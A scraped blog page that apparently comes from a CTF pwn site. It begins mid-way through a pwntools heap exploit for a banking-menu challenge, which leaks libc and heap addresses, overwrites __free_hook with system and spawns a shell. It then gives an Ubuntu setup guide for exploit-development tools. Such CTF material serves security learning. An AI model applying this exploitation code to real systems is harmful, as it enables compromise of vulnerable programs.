password&quot;</span>,passwd)</span><br><span class="line">    sla(<span class="string">&quot;please input the money&quot;</span>,<span class="built_in">str</span>(money))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">passwd</span>):</span>            </span><br><span class="line">    cmd(<span class="string">&quot;Cancellation&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;please enter the password&quot;</span>,passwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span>():</span></span><br><span class="line">    cmd(<span class="string">&quot;Exit_account&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">account,passwd</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;login&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;please input the account id&quot;</span>,account)</span><br><span class="line">    sla(<span class="string">&quot;please input the password&quot;</span>,passwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">passwd,old_passwd</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;Update_info&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;please entet  a new password&quot;</span>,passwd)</span><br><span class="line">    sla(<span class="string">&quot;please input your password.&quot;</span>,old_passwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loan</span>(<span class="params">size,context</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;Loan_money&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Please enter the loan amount (no more than 1 million)&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;Please leave your comments.&quot;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="built_in">str</span>(i)*<span class="number">0x20</span>,<span class="string">&quot;123456&quot;</span>,<span class="number">0x50</span>)</span><br><span class="line">    loan(<span class="number">0x50</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">    quit()</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>+p64(<span class="number">0x461</span>)+<span class="string">&quot;w&quot;</span>*<span class="number">0x20</span>,<span class="string">&quot;123456&quot;</span>,<span class="number">10000000</span>)</span><br><span class="line">loan(<span class="number">0x50</span>,<span class="string">&quot;p&quot;</span>*<span class="number">0x18</span>)</span><br><span class="line">quit()</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;b&quot;</span>*<span class="number">0x20</span>,<span class="string">&quot;123456&quot;</span>,<span class="number">10000000</span>)</span><br><span class="line">quit()</span><br><span class="line">add(<span class="string">&quot;c&quot;</span>*<span class="number">0x20</span>,<span class="string">&quot;123456&quot;</span>,<span class="number">10000000</span>)</span><br><span class="line">quit()</span><br><span class="line">add(<span class="string">&quot;d&quot;</span>*<span class="number">0x20</span>,<span class="string">&quot;123456&quot;</span>,<span class="number">10000000</span>)</span><br><span class="line">quit()</span><br><span class="line">add(<span class="string">&quot;e&quot;</span>*<span class="number">0x20</span>,<span class="string">&quot;123456&quot;</span>,<span class="number">10000000</span>)</span><br><span class="line">quit()</span><br><span class="line">add(<span class="string">&quot;f&quot;</span>*<span class="number">0x20</span>,<span class="string">&quot;123456&quot;</span>,<span class="number">10000000</span>)</span><br><span class="line">quit()</span><br><span class="line"></span><br><span class="line">login(<span class="string">&quot;w&quot;</span>*<span class="number">0x8</span>+<span class="string">&quot;p&quot;</span>*<span class="number">0x18</span>,<span class="string">&quot;w&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">dele(<span class="string">&quot;w&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">login(<span class="string">&quot;b&quot;</span>*<span class="number">0x20</span>,<span class="string">&quot;123456&quot;</span>)</span><br><span class="line">cmd(<span class="string">&quot;I&#x27;m vip!&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;aaaaaaaaa&quot;</span>)</span><br><span class="line">p.recv(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ecbe0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_libc = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line">quit()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    add(<span class="built_in">str</span>(i)+<span class="string">&quot;t&quot;</span>*<span class="number">0x1f</span>,<span class="string">&quot;123456&quot;</span>,<span class="number">0x50</span>)</span><br><span class="line">    quit()</span><br><span class="line"></span><br><span class="line">login(<span class="string">&quot;e&quot;</span>*<span class="number">0x20</span>,<span class="string">&quot;123456&quot;</span>)</span><br><span class="line">dele(<span class="string">&quot;123456&quot;</span>)</span><br><span class="line">login(<span class="string">&quot;f&quot;</span>*<span class="number">0x20</span>,<span class="string">&quot;123456&quot;</span>)</span><br><span class="line">dele(<span class="string">&quot;123456&quot;</span>)</span><br><span class="line"></span><br><span class="line">login(<span class="string">&quot;0&quot;</span>+<span class="string">&quot;t&quot;</span>*<span class="number">0x1f</span>,<span class="string">&quot;123456&quot;</span>)</span><br><span class="line">dele(<span class="string">&quot;123456&quot;</span>)</span><br><span class="line">login(<span class="string">&quot;2&quot;</span>+<span class="string">&quot;t&quot;</span>*<span class="number">0x1f</span>,<span class="string">&quot;123456&quot;</span>)</span><br><span class="line">dele(<span class="string">&quot;123456&quot;</span>)</span><br><span class="line">login(<span class="string">&quot;c&quot;</span>*<span class="number">0x20</span>,<span class="string">&quot;123456&quot;</span>)</span><br><span class="line">cmd(<span class="string">&quot;I&#x27;m vip!&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;aaaaaaaaQ&quot;</span>)</span><br><span class="line">p.recv(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x10</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">quit()</span><br><span class="line">login(p64(heap_base+<span class="number">0x10</span>)+<span class="string">&quot;t&quot;</span>*<span class="number">0x18</span>,p64(heap_base+<span class="number">0x580</span>))</span><br><span class="line">edit(p64(free_hook),p64(heap_base+<span class="number">0x580</span>))</span><br><span class="line"></span><br><span class="line">quit()</span><br><span class="line">add(<span class="string">&quot;g&quot;</span>*<span class="number">0x20</span>,<span class="string">&quot;123456&quot;</span>,<span class="number">10000000</span>)</span><br><span class="line">quit()</span><br><span class="line">add(<span class="string">&quot;h&quot;</span>*<span class="number">0x20</span>,p64(system_libc),<span class="number">10000000</span>)</span><br><span class="line"></span><br><span class="line">quit()</span><br><span class="line">login(<span class="string">&quot;d&quot;</span>*<span class="number">0x20</span>,<span class="string">&quot;123456\x00\x77&quot;</span>)</span><br><span class="line">edit(<span class="string">&quot;/bin/sh\x00&quot;</span>,<span class="string">&quot;123456\x00\x77&quot;</span>)</span><br><span class="line">dele(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/15/ubuntu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/12/15/ubuntu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="post-title-link" itemprop="url">ubuntu环境搭建</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-12-15 16:08:44 / Modified: 16:11:23" itemprop="dateCreated datePublished" datetime="2022-12-15T16:08:44+08:00">2022-12-15</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>6.6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>前置工作</strong></p>
<p>下载 VMware：<a target="_blank" rel="noopener" href="https://www.vmware.com/cn.html">VMware 中国 - 交付面向企业的数字化基础 | CN</a> </p>
<p>下载对应的 Ubuntu 镜像：<a target="_blank" rel="noopener" href="http://mirrors.ustc.edu.cn/ubuntu-releases/">Index of /ubuntu-releases/ (ustc.edu.cn)</a> </p>
<p><strong>安装 Ubuntu</strong></p>
<p>选择新建虚拟机：</p>
<img src="/2022/12/15/ubuntu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1671007078806.png" class width="1671007078806"> 
<p>选择稍后安装：</p>
<img src="/2022/12/15/ubuntu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1671007104568.png" class width="1671007104568"> 
<p>在“虚拟机设置”中选择“CD/DVD”，然后指定 ISO 镜像文件的位置：</p>
<img src="/2022/12/15/ubuntu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1671007295735.png" class width="1671007295735"> 
<p>启动虚拟机开始安装</p>
<p>左侧滑到最下面，然后选择“中文”，接着点击“安装Ubuntu”：</p>
<img src="/2022/12/15/ubuntu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1671007747912.png" class width="1671007747912"> 
<p>接下来的操作有点“炒蛋”，由于窗口空间有限，我们要利用方向键来选择“下一步”：</p>
<img src="/2022/12/15/ubuntu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1671007837090.png" class width="1671007837090"> 
<p>耐心等待程序安装完毕：</p>
<img src="/2022/12/15/ubuntu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1671008237681.png" class width="1671008237681"> 
<ul>
<li>如果嫌慢可以直接 Skip</li>
</ul>
<p><strong>安装 VMwareTools</strong></p>
<p>右键选择“重新安装”：</p>
<img src="/2022/12/15/ubuntu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1671010865246.png" class width="1671010865246"> 
<p>选择左侧的 DVD，把压缩包解压：</p>
<img src="/2022/12/15/ubuntu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1671011046581.png" class width="1671011046581"> 
<p>执行命令 <code>sudo ./vmware-install.pl</code>，如果遇到 [NO] 要选择 [YES]</p>
<p>如果无法实现[主机/虚拟机]复制粘贴，就执行如下命令来安装 open-vm-tools：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install open-vm-tools-desktop fuse</span><br></pre></td></tr></table></figure>
<p><strong>设置共享文件夹</strong></p>
<p>在“虚拟机设置”中选择“共享文件夹”</p>
<img src="/2022/12/15/ubuntu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1671011301541.png" class width="1671011301541"> 
<p>选择“总是启用”后点击添加：</p>
<img src="/2022/12/15/ubuntu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1671011373563.png" class width="1671011373563"> 
<p>选择需要主机上需要共享的文件夹</p>
<p>然后在 <code>/mnt/hgfs</code> 目录下就有我们的共享目录了</p>
<p><strong>安装 Oh My Zsh 美化终端</strong></p>
<p>安装 Zsh：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install zsh</span><br></pre></td></tr></table></figure>
<ul>
<li>将 Zsh 设置为默认 shell</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chsh -s /bin/zsh</span><br></pre></td></tr></table></figure>
<p>安装 Oh My Zsh：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">&quot;$(curl -fsSL https://gitee.com/mirrors/oh-my-zsh/raw/master/tools/install.sh)&quot;</span></span><br></pre></td></tr></table></figure>
<p>安装插件：</p>
<ul>
<li>zsh-autosuggestions（代码补全）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/zsh-users/zsh-autosuggestions $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure>
<ul>
<li>zsh-syntax-highlighting（颜色标记）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/zsh-users/zsh-syntax-highlighting.git $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure>
<ul>
<li>使用 <code>gedit ~/.zshrc</code> 命令进行进行配置（修改 <code>plugins</code>）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">plugins=(</span><br><span class="line">    git</span><br><span class="line">    zsh-autosuggestions</span><br><span class="line">    zsh-syntax-highlighting</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p><strong>安装 Clash for Linux 实现科学上网</strong></p>
<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/Fndroid/clash_for_windows_pkg/releases">Releases · Fndroid/clash_for_windows_pkg (github.com)</a>  </p>
<ul>
<li>下载 <code>Clash.for.Windows-0.17.3-x64-linux.tar.gz</code></li>
</ul>
<p>解压后执行 <code>./cfw</code>：</p>
<img src="/2022/12/15/ubuntu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1671016277529.png" class width="1671016277529"> 
<ul>
<li>需要购买并配置机场</li>
</ul>
<p>设置网络代理：</p>
<img src="/2022/12/15/ubuntu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1671025133872.png" class width="1671025133872"> 
<p>为终端配置代理：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global https.proxy https://127.0.0.1:7890</span><br><span class="line">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure>
<p><strong>Ubuntu 换源</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo cp /etc/apt/sources.list /etc/apt/sources.list.backup</span><br><span class="line">sudo vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
<ul>
<li>更换阿里源：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>
<ul>
<li>保存后更新</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure>
<p><strong>安装 Python 环境</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python2</span><br><span class="line">sudo apt install python3</span><br><span class="line">sudo apt install python3-pip</span><br></pre></td></tr></table></figure>
<p>由于 Ubuntu 官方源已经不支持 pip2 的安装，于是我们只能手动安装 pip2：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/pip/2.7/get-pip.py</span><br><span class="line">python get-pip.py</span><br></pre></td></tr></table></figure>
<p>pip 换源：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">pip3 config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>
<p><strong>安装各种 pwn 工具</strong></p>
<ul>
<li>pwntools（核心）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install --upgrade pwntools</span><br><span class="line">python3 -m pip install --upgrade pwntools</span><br></pre></td></tr></table></figure>
<ul>
<li>patchelf（换 libc 版本）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/NixOS/patchelf.git</span><br><span class="line">cd patchelf</span><br><span class="line">./bootstrap.sh</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make check</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<ul>
<li>glibc-all-in-one（下载 libc 版本）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo git clone https://github.com/matrix1001/glibc-all-in-one.git </span><br><span class="line">cd glibc-all-in-one/</span><br><span class="line">python update_list</span><br></pre></td></tr></table></figure>
<ul>
<li>ROPgadget（找 gadget）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/JonathanSalwan/ROPgadget.git</span><br><span class="line">cd ROPgadget</span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure>
<ul>
<li>ropper（找 gadget）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install ropper</span><br></pre></td></tr></table></figure>
<ul>
<li>seccomp_tools（检测沙盒）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc ruby-dev</span><br><span class="line">sudo gem install seccomp-tools</span><br></pre></td></tr></table></figure>
<ul>
<li>one_gadget（找 one_gadget）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc ruby-dev</span><br><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure>
<p><strong>安装调试工具</strong></p>
<ul>
<li>GDB</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gdb</span><br></pre></td></tr></table></figure>
<ul>
<li>pwngdb</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/scwuaptx/Pwngdb.git </span><br><span class="line">cp ./Pwngdb/.gdbinit ~/</span><br></pre></td></tr></table></figure>
<ul>
<li>pwndbg</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>
<p>pwngdb+pwndbg 文件配置：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gedit ~/.gdbinit</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">source</span> ~/Tools/peda/peda.py</span></span><br><span class="line">source ~/Tools/pwndbg/gdbinit.py </span><br><span class="line">source ~/Tools/Pwngdb/pwngdb.py</span><br><span class="line">source ~/Tools/Pwngdb/angelheap/gdbinit.py</span><br><span class="line"></span><br><span class="line">define hook-run</span><br><span class="line">python</span><br><span class="line">import angelheap</span><br><span class="line">angelheap.init_angelheap()</span><br><span class="line">end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p><strong>下载与更换 gcc 版本</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install g++-5</span><br><span class="line">sudo apt install gcc-5</span><br><span class="line">sudo apt install g++-7</span><br><span class="line">sudo apt install gcc-7</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  Tools ls  /usr/bin | grep g++</span><br><span class="line">g++</span><br><span class="line">g++<span class="number">-5</span></span><br><span class="line">g++<span class="number">-7</span></span><br><span class="line">g++<span class="number">-9</span></span><br><span class="line">x86_64-linux-gnu-g++</span><br><span class="line">x86_64-linux-gnu-g++<span class="number">-5</span></span><br><span class="line">x86_64-linux-gnu-g++<span class="number">-7</span></span><br><span class="line">x86_64-linux-gnu-g++<span class="number">-9</span></span><br></pre></td></tr></table></figure>
<p>使用以下命令生成链接组：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-5 50 --slave /usr/bin/g++ g++ /usr/bin/g++-5</span><br><span class="line">sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-7 50 --slave /usr/bin/g++ g++ /usr/bin/g++-7</span><br><span class="line">sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-9 50 --slave /usr/bin/g++ g++ /usr/bin/g++-9</span><br></pre></td></tr></table></figure>
<p>使用如下命令更换 gcc：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo update-alternatives --config gcc</span><br></pre></td></tr></table></figure>
<p>效果如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">有 <span class="number">3</span> 个候选项可用于替换 gcc (提供 /usr/bin/gcc)。</span><br><span class="line"></span><br><span class="line">  选择       路径          优先级  状态</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">* <span class="number">0</span>            /usr/bin/gcc<span class="number">-5</span>   <span class="number">50</span>        自动模式</span><br><span class="line">  <span class="number">1</span>            /usr/bin/gcc<span class="number">-5</span>   <span class="number">50</span>        手动模式</span><br><span class="line">  <span class="number">2</span>            /usr/bin/gcc<span class="number">-7</span>   <span class="number">50</span>        手动模式</span><br><span class="line">  <span class="number">3</span>            /usr/bin/gcc<span class="number">-9</span>   <span class="number">50</span>        手动模式</span><br><span class="line"></span><br><span class="line">要维持当前值[*]请按&lt;回车键&gt;，或者键入选择的编号：</span><br></pre></td></tr></table></figure>
<p><strong>安装 docker</strong></p>
<p>docker：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br><span class="line">sudo add-apt-repository &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu focal stable&quot;</span><br><span class="line">sudo apt update</span><br><span class="line">apt-cache policy docker-ce</span><br><span class="line">sudo apt install docker-ce</span><br></pre></td></tr></table></figure>
<ul>
<li>检测 docker 是否运行：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl status docker</span><br></pre></td></tr></table></figure>
<ul>
<li>docker 换源：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo touch /etc/docker/daemon.json</span><br><span class="line">sudo vim /etc/docker/daemon.json</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;https://hub-mirror.c.163.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https://ustc-edu-cn.mirror.aliyuncs.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https://ghcr.io&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https://mirror.baidubce.com&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>不用 sudo 来执行 docker 命令：</li>
</ul>
